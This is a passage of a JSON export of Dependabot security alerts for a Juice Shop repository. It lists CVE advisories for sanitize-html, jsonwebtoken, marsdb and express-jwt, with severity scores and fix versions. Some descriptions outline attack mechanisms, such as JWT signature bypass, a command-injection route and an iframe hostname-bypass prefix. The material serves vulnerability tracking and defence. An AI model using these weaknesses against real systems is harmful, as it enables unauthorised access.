            "vulnerable_version_range": "< 2.7.1",
            "first_patched_version": {
              "identifier": "2.7.1"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "score": 7.5
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00048,
          "percentile": 0.14691
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "score": 7.5
        },
        "cwes": [
          {
            "cwe_id": "CWE-1333",
            "name": "Inefficient Regular Expression Complexity"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "severity": "high",
        "vulnerable_version_range": "< 2.7.1",
        "first_patched_version": {
          "identifier": "2.7.1"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/12",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/12",
      "created_at": "2025-06-11T06:30:58Z",
      "updated_at": "2025-06-11T06:30:58Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 11,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-rm97-x556-q36h",
        "cve_id": "CVE-2024-21501",
        "summary": "sanitize-html Information Exposure vulnerability",
        "description": "Versions of the package sanitize-html before 2.12.1 are vulnerable to Information Exposure when used on the backend and with the style attribute allowed, allowing enumeration of files in the system (including project dependencies). An attacker could exploit this vulnerability to gather details about the file system structure and dependencies of the targeted server.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-rm97-x556-q36h",
            "type": "GHSA"
          },
          {
            "value": "CVE-2024-21501",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21501"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/pull/650"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/commit/c5dbdf77fe8b836d3bf4554ea39edb45281ec0b4"
          },
          {
            "url": "https://gist.github.com/Slonser/8b4d061abe6ee1b2e10c7242987674cf"
          },
          {
            "url": "https://github.com/apostrophecms/apostrophe/discussions/4436"
          },
          {
            "url": "https://security.snyk.io/vuln/SNYK-JS-SANITIZEHTML-6256334"
          },
          {
            "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-6276557"
          },
          {
            "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4EB5JPYRCTS64EA5AMV3INHDPI6I4AW7"
          },
          {
            "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/P4I5X6V3LYUNBMZ5YOW4BV427TH3IK4S"
          },
          {
            "url": "https://github.com/advisories/GHSA-rm97-x556-q36h"
          }
        ],
        "published_at": "2024-02-24T06:30:17Z",
        "updated_at": "2024-08-28T21:58:19Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "sanitize-html"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 2.12.1",
            "first_patched_version": {
              "identifier": "2.12.1"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "score": 5.3
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00991,
          "percentile": 0.75692
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
          "score": 5.3
        },
        "cwes": [
          {
            "cwe_id": "CWE-200",
            "name": "Exposure of Sensitive Information to an Unauthorized Actor"
          },
          {
            "cwe_id": "CWE-538",
            "name": "Insertion of Sensitive Information into Externally-Accessible File or Directory"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "severity": "medium",
        "vulnerable_version_range": "< 2.12.1",
        "first_patched_version": {
          "identifier": "2.12.1"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/11",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/11",
      "created_at": "2025-06-11T06:30:58Z",
      "updated_at": "2025-06-11T06:30:58Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 10,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "jsonwebtoken"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-qwph-4952-7xr6",
        "cve_id": "CVE-2022-23540",
        "summary": "jsonwebtoken vulnerable to signature validation bypass due to insecure default algorithm in jwt.verify()",
        "description": "# Overview\n\nIn versions <=8.5.1 of jsonwebtoken library, lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification.\n\n# Am I affected?\nYou will be affected if all the following are true in the `jwt.verify()` function:\n- a token with no signature is received\n- no algorithms are specified \n- a falsy (e.g. null, false, undefined) secret or key is passed \n\n# How do I fix it?\n \nUpdate to version 9.0.0 which removes the default support for the none algorithm in the `jwt.verify()` method. \n\n# Will the fix impact my users?\n\nThere will be no impact, if you update to version 9.0.0 and you don’t need to allow for the `none` algorithm. If you need 'none' algorithm, you have to explicitly specify that in `jwt.verify()` options.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-qwph-4952-7xr6",
            "type": "GHSA"
          },
          {
            "value": "CVE-2022-23540",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-qwph-4952-7xr6"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23540"
          },
          {
            "url": "https://security.netapp.com/advisory/ntap-20240621-0007"
          },
          {
            "url": "https://github.com/advisories/GHSA-qwph-4952-7xr6"
          }
        ],
        "published_at": "2022-12-22T03:32:59Z",
        "updated_at": "2025-02-13T18:33:13Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "jsonwebtoken"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 9.0.0",
            "first_patched_version": {
              "identifier": "9.0.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L",
            "score": 6.4
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00024,
          "percentile": 0.04833
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L",
          "score": 6.4
        },
        "cwes": [
          {
            "cwe_id": "CWE-287",
            "name": "Improper Authentication"
          },
          {
            "cwe_id": "CWE-327",
            "name": "Use of a Broken or Risky Cryptographic Algorithm"
          },
          {
            "cwe_id": "CWE-347",
            "name": "Improper Verification of Cryptographic Signature"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "jsonwebtoken"
        },
        "severity": "medium",
        "vulnerable_version_range": "< 9.0.0",
        "first_patched_version": {
          "identifier": "9.0.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/10",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/10",
      "created_at": "2025-06-11T06:30:58Z",
      "updated_at": "2025-06-11T06:30:58Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 9,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "jsonwebtoken"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-hjrf-2m68-5959",
        "cve_id": "CVE-2022-23541",
        "summary": "jsonwebtoken's insecure implementation of key retrieval function could lead to Forgeable Public/Private Tokens from RSA to HMAC",
        "description": "# Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library can be misconfigured so that passing a poorly implemented key retrieval function (referring to the `secretOrPublicKey` argument from the [readme link](https://github.com/auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) will result in incorrect verification of tokens. There is a possibility of using a different algorithm and key combination in verification  than the one that was used to sign the tokens. Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of forged tokens. \n\n# Am I affected?\n\nYou will be affected if your application is supporting usage of both symmetric key and asymmetric key in jwt.verify() implementation with the same key retrieval function. \n\n# How do I fix it?\n \nUpdate to version 9.0.0.\n\n# Will the fix impact my users?\n\nThere is no impact for end users",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-hjrf-2m68-5959",
            "type": "GHSA"
          },
          {
            "value": "CVE-2022-23541",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-hjrf-2m68-5959"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23541"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/releases/tag/v9.0.0"
          },
          {
            "url": "https://security.netapp.com/advisory/ntap-20240621-0007"
          },
          {
            "url": "https://github.com/advisories/GHSA-hjrf-2m68-5959"
          }
        ],
        "published_at": "2022-12-22T03:33:19Z",
        "updated_at": "2024-06-24T21:24:07Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "jsonwebtoken"
            },
            "severity": "medium",
            "vulnerable_version_range": "<= 8.5.1",
            "first_patched_version": {
              "identifier": "9.0.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L",
            "score": 5.0
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00049,
          "percentile": 0.15032
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L",
          "score": 5.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-287",
            "name": "Improper Authentication"
          },
          {
            "cwe_id": "CWE-1259",
            "name": "Improper Restriction of Security Token Assignment"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "jsonwebtoken"
        },
        "severity": "medium",
        "vulnerable_version_range": "<= 8.5.1",
        "first_patched_version": {
          "identifier": "9.0.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/9",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/9",
      "created_at": "2025-06-11T06:30:58Z",
      "updated_at": "2025-06-11T06:30:58Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 8,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "jsonwebtoken"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-8cf7-32gw-wr33",
        "cve_id": "CVE-2022-23539",
        "summary": "jsonwebtoken unrestricted key type could lead to legacy keys usage ",
        "description": "# Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library could be misconfigured so that legacy, insecure key types are used for signature verification. For example, DSA keys could be used with the RS256 algorithm. \n\n# Am I affected?\n\nYou are affected if you are using an algorithm and a key type other than the combinations mentioned below\n\n| Key type |  algorithm                                    |\n|----------|------------------------------------------|\n| ec           | ES256, ES384, ES512                      |\n| rsa          | RS256, RS384, RS512, PS256, PS384, PS512 |\n| rsa-pss  | PS256, PS384, PS512                      |\n\nAnd for Elliptic Curve algorithms:\n\n| `alg` | Curve      |\n|-------|------------|\n| ES256 | prime256v1 |\n| ES384 | secp384r1  |\n| ES512 | secp521r1  |\n\n# How do I fix it?\n\nUpdate to version 9.0.0. This version validates for asymmetric key type and algorithm combinations. Please refer to the above mentioned algorithm / key type combinations for the valid secure configuration. After updating to version 9.0.0, If you still intend to continue with signing or verifying tokens using invalid key type/algorithm value combinations, you’ll need to set the `allowInvalidAsymmetricKeyTypes` option to `true` in the `sign()` and/or `verify()` functions.\n\n# Will the fix impact my users?\n\nThere will be no impact, if you update to version 9.0.0 and you already use a valid secure combination of key type and algorithm. Otherwise,  use the  `allowInvalidAsymmetricKeyTypes` option  to `true` in the `sign()` and `verify()` functions to continue usage of invalid key type/algorithm combination in 9.0.0 for legacy compatibility. \n\n",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-8cf7-32gw-wr33",
            "type": "GHSA"
          },
          {
            "value": "CVE-2022-23539",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/security/advisories/GHSA-8cf7-32gw-wr33"
          },
          {
            "url": "https://github.com/auth0/node-jsonwebtoken/commit/e1fa9dcc12054a8681db4e6373da1b30cf7016e3"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23539"
          },
          {
            "url": "https://security.netapp.com/advisory/ntap-20240621-0007"
          },
          {
            "url": "https://github.com/advisories/GHSA-8cf7-32gw-wr33"
          }
        ],
        "published_at": "2022-12-22T03:32:22Z",
        "updated_at": "2024-06-24T21:23:39Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "jsonwebtoken"
            },
            "severity": "high",
            "vulnerable_version_range": "<= 8.5.1",
            "first_patched_version": {
              "identifier": "9.0.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "score": 8.1
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00089,
          "percentile": 0.26488
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
          "score": 8.1
        },
        "cwes": [
          {
            "cwe_id": "CWE-327",
            "name": "Use of a Broken or Risky Cryptographic Algorithm"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "jsonwebtoken"
        },
        "severity": "high",
        "vulnerable_version_range": "<= 8.5.1",
        "first_patched_version": {
          "identifier": "9.0.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/8",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/8",
      "created_at": "2025-06-11T06:30:58Z",
      "updated_at": "2025-06-11T06:30:58Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 7,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-rjqq-98f6-6j3r",
        "cve_id": "CVE-2021-26539",
        "summary": "Improper Input Validation in sanitize-html",
        "description": "Apostrophe Technologies sanitize-html before 2.3.1 does not properly handle internationalized domain name (IDN) which could allow an attacker to bypass hostname whitelist validation set by the \"allowedIframeHostnames\" option.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-rjqq-98f6-6j3r",
            "type": "GHSA"
          },
          {
            "value": "CVE-2021-26539",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-26539"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/pull/458"
          },
          {
            "url": "https://advisory.checkmarx.net/advisory/CX-2021-4308"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/blob/main/CHANGELOG.md#231-2021-01-22"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/commit/bdf7836ef8f0e5b21f9a1aab0623ae8fcd09c1da"
          },
          {
            "url": "https://github.com/advisories/GHSA-rjqq-98f6-6j3r"
          }
        ],
        "published_at": "2021-05-06T16:10:05Z",
        "updated_at": "2023-04-21T19:19:09Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "sanitize-html"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 2.3.1",
            "first_patched_version": {
              "identifier": "2.3.1"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "score": 5.3
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00288,
          "percentile": 0.51774
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "score": 5.3
        },
        "cwes": [
          {
            "cwe_id": "CWE-20",
            "name": "Improper Input Validation"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "severity": "medium",
        "vulnerable_version_range": "< 2.3.1",
        "first_patched_version": {
          "identifier": "2.3.1"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/7",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/7",
      "created_at": "2025-06-11T06:30:58Z",
      "updated_at": "2025-06-11T06:30:58Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 6,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-mjxr-4v3x-q3m4",
        "cve_id": "CVE-2021-26540",
        "summary": "Improper Input Validation in sanitize-html",
        "description": "Apostrophe Technologies sanitize-html before 2.3.2 does not properly validate the hostnames set by the \"allowedIframeHostnames\" option when the \"allowIframeRelativeUrls\" is set to true, which allows attackers to bypass hostname whitelist for iframe element, related using an src value that starts with \"/\\\\example.com\".",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-mjxr-4v3x-q3m4",
            "type": "GHSA"
          },
          {
            "value": "CVE-2021-26540",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-26540"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/pull/460"
          },
          {
            "url": "https://advisory.checkmarx.net/advisory/CX-2021-4309"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/blob/main/CHANGELOG.md#232-2021-01-26"
          },
          {
            "url": "https://github.com/advisories/GHSA-mjxr-4v3x-q3m4"
          }
        ],
        "published_at": "2021-05-06T16:10:19Z",
        "updated_at": "2023-02-01T05:05:21Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "sanitize-html"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 2.3.2",
            "first_patched_version": {
              "identifier": "2.3.2"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "score": 5.3
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00288,
          "percentile": 0.51731
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "score": 5.3
        },
        "cwes": [
          {
            "cwe_id": "CWE-20",
            "name": "Improper Input Validation"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "severity": "medium",
        "vulnerable_version_range": "< 2.3.2",
        "first_patched_version": {
          "identifier": "2.3.2"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/6",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/6",
      "created_at": "2025-06-11T06:30:58Z",
      "updated_at": "2025-06-11T06:30:58Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 5,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "marsdb"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-5mrr-rgp6-x4gr",
        "cve_id": null,
        "summary": "Command Injection in marsdb",
        "description": "All versions of `marsdb` are vulnerable to Command Injection. In the `DocumentMatcher` class, selectors on `$where` clauses are passed to a Function constructor unsanitized. This allows attackers to run arbitrary commands in the system when the function is executed.\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.",
        "severity": "critical",
        "identifiers": [
          {
            "value": "GHSA-5mrr-rgp6-x4gr",
            "type": "GHSA"
          }
        ],
        "references": [
          {
            "url": "https://github.com/bkimminich/juice-shop/issues/1173"
          },
          {
            "url": "https://www.npmjs.com/advisories/1122"
          },
          {
            "url": "https://github.com/advisories/GHSA-5mrr-rgp6-x4gr"
          }
        ],
        "published_at": "2020-09-03T19:39:05Z",
        "updated_at": "2023-01-09T05:03:48Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "marsdb"
            },
            "severity": "critical",
            "vulnerable_version_range": ">= 0.0.0",
            "first_patched_version": null
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": null,
            "score": 0.0
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "cvss": {
          "vector_string": null,
          "score": 0.0
        },
        "cwes": [
          {
            "cwe_id": "CWE-77",
            "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "marsdb"
        },
        "severity": "critical",
        "vulnerable_version_range": ">= 0.0.0",
        "first_patched_version": null
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/5",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/5",
      "created_at": "2025-06-11T06:30:58Z",
      "updated_at": "2025-06-11T06:30:58Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 4,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "express-jwt"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-6g6m-m6h5-w9gf",
        "cve_id": "CVE-2020-15084",
        "summary": "Authorization bypass in express-jwt",
        "description": "### Overview\nVersions before and including 5.3.3, we are not enforcing the **algorithms** entry to be specified in the configuration.\nWhen **algorithms** is not specified in the configuration, with the combination of jwks-rsa, it may lead to authorization bypass. \n\n### Am I affected?\nYou are affected by this vulnerability if all of the following conditions apply:\n\nYou are using express-jwt\nAND \nYou do not have **algorithms**  configured in your express-jwt configuration.\nAND\nYou are using libraries such as jwks-rsa as the **secret**. \n\n### How to fix that?\nSpecify **algorithms** in the express-jwt configuration. The following is an example of a proper configuration\n\n``` \nconst checkJwt = jwt({\n  secret: jwksRsa.expressJwtSecret({\n    rateLimit: true,\n    jwksRequestsPerMinute: 5,\n    jwksUri: `https://${DOMAIN}/.well-known/jwks.json`\n  }),\n  // Validate the audience and the issuer.\n  audience: process.env.AUDIENCE,\n  issuer: `https://${DOMAIN}/`,\n  // restrict allowed algorithms\n  algorithms: ['RS256']\n}); \n```\n\n### Will this update impact my users?\nThe fix provided in patch will not affect your users if you specified the algorithms allowed. The patch now makes **algorithms** a required configuration. \n\n\n### Credit\nIST Group",
        "severity": "high",
        "identifiers": [
          {
            "value": "GHSA-6g6m-m6h5-w9gf",
            "type": "GHSA"
          },
          {
            "value": "CVE-2020-15084",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://github.com/auth0/express-jwt/security/advisories/GHSA-6g6m-m6h5-w9gf"
          },
          {
            "url": "https://github.com/auth0/express-jwt/commit/7ecab5f8f0cab5297c2b863596566eb0c019cdef"
          },
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15084"
          },
          {
            "url": "https://github.com/advisories/GHSA-6g6m-m6h5-w9gf"
          }
        ],
        "published_at": "2020-06-30T16:05:24Z",
        "updated_at": "2023-02-02T05:04:02Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "express-jwt"
            },
            "severity": "high",
            "vulnerable_version_range": "<= 5.3.3",
            "first_patched_version": {
              "identifier": "6.0.0"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N",
            "score": 7.7
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00064,
          "percentile": 0.20109
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N",
          "score": 7.7
        },
        "cwes": [
          {
            "cwe_id": "CWE-285",
            "name": "Improper Authorization"
          },
          {
            "cwe_id": "CWE-863",
            "name": "Incorrect Authorization"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
          "name": "express-jwt"
        },
        "severity": "high",
        "vulnerable_version_range": "<= 5.3.3",
        "first_patched_version": {
          "identifier": "6.0.0"
        }
      },
      "url": "https://api.github.com/repos/Champmsecurity/juice-shop/dependabot/alerts/4",
      "html_url": "https://github.com/Champmsecurity/juice-shop/security/dependabot/4",
      "created_at": "2025-06-11T06:30:57Z",
      "updated_at": "2025-06-11T06:30:57Z",
      "dismissed_at": null,
      "dismissed_by": null,
      "dismissed_reason": null,
      "dismissed_comment": null,
      "fixed_at": null,
      "auto_dismissed_at": null
    },
    {
      "number": 3,
      "state": "open",
      "dependency": {
        "package": {
          "ecosystem": "npm",
          "name": "sanitize-html"
        },
        "manifest_path": "package.json",
        "scope": "runtime",
        "relationship": "direct"
      },
      "security_advisory": {
        "ghsa_id": "GHSA-3j7m-hmh3-9jmp",
        "cve_id": "CVE-2016-1000237",
        "summary": "Cross-Site Scripting in sanitize-html",
        "description": "Affected versions of `sanitize-html` do not sanitize input recursively, which may allow an attacker to execute arbitrary Javascript.\n\n\n## Recommendation\n\nUpdate to version 1.4.3 or later.",
        "severity": "medium",
        "identifiers": [
          {
            "value": "GHSA-3j7m-hmh3-9jmp",
            "type": "GHSA"
          },
          {
            "value": "CVE-2016-1000237",
            "type": "CVE"
          }
        ],
        "references": [
          {
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000237"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/issues/29"
          },
          {
            "url": "https://github.com/apostrophecms/sanitize-html/commit/762fbc7bba389f3f789cc291c1eb2b64f60f2caf"
          },
          {
            "url": "https://raw.githubusercontent.com/distributedweaknessfiling/cvelist/master/2016/1000xxx/CVE-2016-1000237.json"
          },
          {
            "url": "https://github.com/punkave/sanitize-html/issues/29"
          },
          {
            "url": "https://www.npmjs.com/advisories/135"
          },
          {
            "url": "https://github.com/advisories/GHSA-3j7m-hmh3-9jmp"
          }
        ],
        "published_at": "2020-04-16T03:14:47Z",
        "updated_at": "2023-01-09T05:02:23Z",
        "withdrawn_at": null,
        "vulnerabilities": [
          {
            "package": {
              "ecosystem": "npm",
              "name": "sanitize-html"
            },
            "severity": "medium",
            "vulnerable_version_range": "< 1.4.3",
            "first_patched_version": {
              "identifier": "1.4.3"
            }
          }
        ],
        "cvss_severities": {
          "cvss_v3": {
            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "score": 6.1
          },
          "cvss_v4": {
            "vector_string": null,
            "score": 0.0
          }
        },
        "epss": {
          "percentage": 0.00328,
          "percentile": 0.54776
        },
        "cvss": {
          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "score": 6.1
        },
        "cwes": [
          {
            "cwe_id": "CWE-79",
            "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
          }
        ]
      },
      "security_vulnerability": {
        "package": {
          "ecosystem": "npm",
